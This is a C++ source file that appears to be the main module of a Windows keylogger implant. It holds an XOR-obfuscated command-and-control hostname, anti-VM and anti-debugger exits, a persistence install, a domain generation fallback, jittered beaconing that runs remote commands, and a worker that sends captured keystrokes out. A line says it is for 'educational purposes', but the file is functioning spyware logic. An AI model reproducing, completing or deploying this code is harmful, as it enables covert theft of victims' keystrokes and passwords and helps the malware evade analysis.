#define _WIN32_WINNT 0x0601

#include <windows.h>
#include <wininet.h>
#include <string>
#include <thread>
#include <chrono>
#include <sstream>
#include <algorithm>
#include <iomanip>
#include <fstream>
#include <ctime>
#include <random>
#include <tlhelp32.h>

#include "config.hpp"
#include "keylogger.h"
#include "utils.h"
#include "persistence.h"
#include "anti_vm.h"
#include "anti_debug.h"
#include "network.h"

// Function prototypes for functions defined elsewhere
std::string deobfuscate(const char* obf_str);
std::string generate_client_id();
bool is_running_in_vm();
bool is_debugger_present();
void install_persistence();
bool register_with_c2();
bool send_http_request(const std::string& endpoint,
    const std::string& method,
    const std::string& data,
    std::string* response);
bool exfiltrate_keylog_data(const std::string& data);
std::string get_system_info();
int get_random_sleep_interval(int base_seconds);

// Obfuscated strings (XOR encoded at compile time)
const char obf_c2_server[] = {0x28, 0x36, 0x29, 0x35, 0x7c, 0x2d, 0x26, 0x2c, 0x2e, 0x2d, 0x29, 0x30, 0x35, 0x2a, 0x2e, 0x7c, 0x27, 0x2a, 0x31, 0x00}; // cybr.hamishburke.dev
const char obf_secret[] = {0x28, 0x2d, 0x26, 0x2c, 0x2a, 0x2c, 0x2a, 0x00}; // changeme
const char obf_useragent[] = {0x32, 0x2e, 0x3b, 0x2e, 0x2f, 0x2f, 0x26, 0x68, 0x77, 0x7c, 0x75, 0x69, 0x45, 0x2e, 0x2c, 0x27, 0x2e, 0x33, 0x36, 0x00}; // Mozilla/5.0

// Global variables
string client_id;
string c2_server;
int c2_port = 443;
string shared_secret;
char encryption_key = 0x42;
string key_buffer;
bool registered = false;
int exfiltration_retry_count = 3;
mt19937 rng(chrono::steady_clock::now().time_since_epoch().count());


// Generate variable sleep intervals to avoid pattern detection
int get_random_sleep_interval(int base_seconds) {
    uniform_int_distribution<int> dist(base_seconds * 500, base_seconds * 1500); // 50%-150% of base
    return dist(rng);
}

// Enhanced XOR encoding with key rotation
string xor_encode_with_rotation(const string& data, char& key) {
    string result;
    for (char c : data) {
        result += (c ^ key);
        key = (key >> 1) | ((key & 1) << 7);
    }
    return result;
}

string xor_decode_with_rotation(const string& data, char key) {
    string result;
    for (char c : data) {
        result += (c ^ key);
        key = (key >> 1) | ((key & 1) << 7);
    }
    return result;
}

// Domain Generation Algorithm for C2 resilience
string generate_dga_domain() {
    time_t now = time(0);
    struct tm* timeinfo = localtime(&now);
    int seed = timeinfo->tm_year + timeinfo->tm_mon + timeinfo->tm_mday;
    
    mt19937 dga_rng(seed);
    uniform_int_distribution<int> char_dist(0, 25);
    
    string domain;
    for (int i = 0; i < 12; i++) {
        domain += (char)('a' + char_dist(dga_rng));
    }
    domain += ".com";
    return domain;
}

string get_timestamp() {
    auto now = chrono::system_clock::now();
    auto time_t = chrono::system_clock::to_time_t(now);
    stringstream ss;
    ss << put_time(localtime(&time_t), "%Y-%m-%d %H:%M:%S");
    return ss.str();
}

string get_system_info() {
    stringstream info;
    
    OSVERSIONINFO osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    if (GetVersionEx(&osvi)) {
        info << "OS:" << osvi.dwMajorVersion << "." << osvi.dwMinorVersion;
    }
    
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    info << ";ARCH:";
    switch(si.wProcessorArchitecture) {
        case PROCESSOR_ARCHITECTURE_AMD64:
            info << "x64";
            break;
        case PROCESSOR_ARCHITECTURE_INTEL:
            info << "x86";
            break;
        default:
            info << "unknown";
    }
    
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    if (GetComputerNameA(computerName, &size)) {
        info << ";HOST:" << computerName;
    }
    
    return info.str();
}

void exfiltration_worker() {
    while (true) {
        Sleep(get_random_sleep_interval(60)); // Variable exfiltration interval
        
        if (!key_buffer.empty()) {
            string data_to_send = key_buffer;
            if (exfiltrate_keylog_data(data_to_send)) {
                key_buffer.clear();
            }
        }
    }
}

void execute_command(const string& command) {
    if (command.find("slp ") == 0) {
        try {
            int n = stoi(command.substr(4));
            Sleep(n * 1000);
        } catch (...) {
            // Invalid sleep time, ignore
        }
    } else if (command == "shd") {
        ExitProcess(0);
    } else if (command.find("pwn ") == 0) {
        string message = command.substr(4);
        if (message.empty()) {
            message = "Sorry, you've been pwned, for educational purposes!";
        }
        wstring wmessage(message.begin(), message.end());
        MessageBoxW(NULL, wmessage.c_str(), L"PWNED!", MB_OK | MB_ICONWARNING);
    } else if (command == "get_keys") {
        if (!key_buffer.empty()) {
            exfiltrate_keylog_data(key_buffer);
            key_buffer.clear();
        }
    }
}

void beacon() {
    while (true) {
        try {
            // Anti-debugging check during runtime
            if (is_debugger_present()) {
                ExitProcess(0);
            }
            
            string endpoint = "/command?id=" + client_id;
            string response;
            
            if (send_http_request(endpoint, "GET", "", &response)) {
                if (!response.empty() && response != "\"\"" && response.find("\"cmd\":\"\"") == string::npos) {
                    size_t cmd_pos = response.find("\"cmd\":\"");
                    if (cmd_pos != string::npos) {
                        cmd_pos += 7;
                        size_t end_pos = response.find("\"", cmd_pos);
                        if (end_pos != string::npos) {
                            string command = response.substr(cmd_pos, end_pos - cmd_pos);
                            if (!command.empty()) {
                                execute_command(command);
                            }
                        }
                    }
                }
            }
        } catch (...) {
            // Continue beaconing
        }
        
        Sleep(get_random_sleep_interval(30)); // Variable beacon interval
    }
}

int main() {
    // Deobfuscate configuration
    c2_server = deobfuscate(obf_c2_server);
    shared_secret = deobfuscate(obf_secret);
    
    // Anti-VM and anti-debugging checks
    if (is_running_in_vm() || is_debugger_present()) {
        // Act like a benign application or exit silently
        ExitProcess(0);
    }
    
    // Install persistence
    install_persistence();
    

    // gen client id
    client_id = generate_client_id();
    
    // Register with fallback to DGA domains
    bool registration_success = false;
    for (int i = 0; i < 3; i++) {
        if (register_with_c2()) {
            registration_success = true;
            break;
        }
        
        // Try DGA domain as fallback
        c2_server = generate_dga_domain();
        Sleep(get_random_sleep_interval(5));
    }
    
    // Reset to primary server if DGA was used
    if (!registration_success) {
        c2_server = deobfuscate(obf_c2_server);
    }
    
    thread exfil_thread(exfiltration_worker);
    exfil_thread.detach();
    
    thread beacon_thread(beacon);
    beacon_thread.detach();

    // Start keylogger (runs message loop and installs hook)
    start_keylogger();

    return 0;
}
